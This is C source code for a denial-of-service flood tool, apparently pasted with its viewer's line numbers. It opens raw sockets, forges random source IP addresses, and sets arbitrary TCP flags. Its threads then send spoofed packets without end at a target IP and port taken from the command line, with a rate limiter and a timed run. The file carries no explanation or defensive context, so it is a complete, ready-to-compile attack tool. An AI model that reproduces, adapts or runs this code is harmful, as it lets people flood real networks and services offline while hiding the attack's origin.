
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
int ack, syn, psh, fin, rst, urg, ptr, res2, seq;
void init_rand(unsigned long int x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}
unsigned long int rand_cmwc(void) {
  unsigned long long int t, a = 18782LL;
  static unsigned long int i = 4095;
  unsigned long int x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}
unsigned short csum(unsigned short *buf, int count) {
  register unsigned long sum = 0;
  while (count > 1) {
    sum += *buf++;
    count -= 2;
  }
  if (count > 0) {
    sum += *(unsigned char *)buf;
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return (unsigned short)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
  struct tcp_pseudo {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
  } pseudohead;
  unsigned short total_len = iph->tot_len;
  pseudohead.src_addr = iph->saddr;
  pseudohead.dst_addr = iph->daddr;
  pseudohead.zero = 0;
  pseudohead.proto = IPPROTO_TCP;
  pseudohead.length = htons(sizeof(struct tcphdr));
  int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
  unsigned short *tcp = malloc(totaltcp_len);
  memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
  memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo),
         (unsigned char *)tcph, sizeof(struct tcphdr));
  unsigned short output = csum(tcp, totaltcp_len);
  free(tcp);
  return output;
}
void setup_ip_header(struct iphdr *iph) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
  iph->id = htonl(rand() % 54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = 6;
  iph->check = 0;
  iph->saddr = inet_addr("8.8.8.8");
}
void setup_tcp_header(struct tcphdr *tcph) {
  tcph->source = htons(rand() % 65535);
  tcph->seq = rand();
  tcph->ack = ack;
  tcph->ack_seq = seq;
  tcph->psh = psh;
  tcph->fin = fin;
  tcph->rst = rst;
  tcph->res2 = res2;
  tcph->doff = 5;
  tcph->syn = syn;
  tcph->urg = urg;
  tcph->urg_ptr = ptr;
  tcph->window = rand();
  tcph->check = 0;
}
void *flood(void *par1) {
  char *td = (char *)par1;
  char datagram[MAX_PACKET_SIZE];
  struct iphdr *iph = (struct iphdr *)datagram;
  struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(floodport);
  sin.sin_addr.s_addr = inet_addr(td);
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0) {
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }
  memset(datagram, 0, MAX_PACKET_SIZE);
  setup_ip_header(iph);
  setup_tcp_header(tcph);
  tcph->dest = htons(floodport);
  iph->daddr = sin.sin_addr.s_addr;
  iph->check = csum((unsigned short *)datagram, iph->tot_len);
  int tmp = 1;
  const int *val = &tmp;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }
  init_rand(time(NULL));
  register unsigned int i;
  i = 0;
  while (1) {
    sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 |
                 (rand_cmwc() >> 16 & 0xFF) << 16 |
                 (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
    iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    tcph->seq = rand_cmwc() & 0xFFFF;
    tcph->source = htons(rand_cmwc() & 0xFFFF);
    tcph->check = 0;
    tcph->check = tcpcsum(iph, tcph);
    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
  }
}
int main(int argc, char *argv[]) {
  if (argc < 7) {
    fprintf(stderr, "Invalid parameters!\n");
    fprintf(stdout,
            "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no "
            "limit> <time> <ack,syn,psh,fin,rst,urg,ptr,res2,seq>\n",
            argv[0]);
    exit(-1);
  }
  fprintf(stdout, "Opening sockets...\n");
  int num_threads = atoi(argv[3]);
  floodport = atoi(argv[2]);
  int maxpps = atoi(argv[4]);
  limiter = 0;
  pps = 0;
  pthread_t thread[num_threads];
  if (strstr(argv[6], "ack"))
    ack = 1;
  else
    ack = 0;
  if (strstr(argv[6], "seq"))
    seq = 1;
  else
    seq = 0;
  if (strstr(argv[6], "psh"))
    psh = 1;
  else
    psh = 0;
  if (strstr(argv[6], "fin"))
    fin = 1;
  else
    fin = 0;
  if (strstr(argv[6], "rst"))
    rst = 1;
  else
    rst = 0;
  if (strstr(argv[6], "res2"))
    res2 = 1;
  else
    res2 = 0;
  if (strstr(argv[6], "syn"))
    syn = 1;
  else
    syn = 0;
  if (strstr(argv[6], "urg"))
    urg = 1;
  else
    urg = 0;
  if (strstr(argv[6], "ptr"))
    ptr = 1;
  else
    ptr = 0;
  int multiplier = 20;
  int i;
  for (i = 0; i < num_threads; i++) {
    pthread_create(&thread[i], NULL, &flood, (void *)argv[1]);
  }
  fprintf(stdout, "Sending attack...\n");
  for (i = 0; i < (atoi(argv[5]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
 
  return 0;
}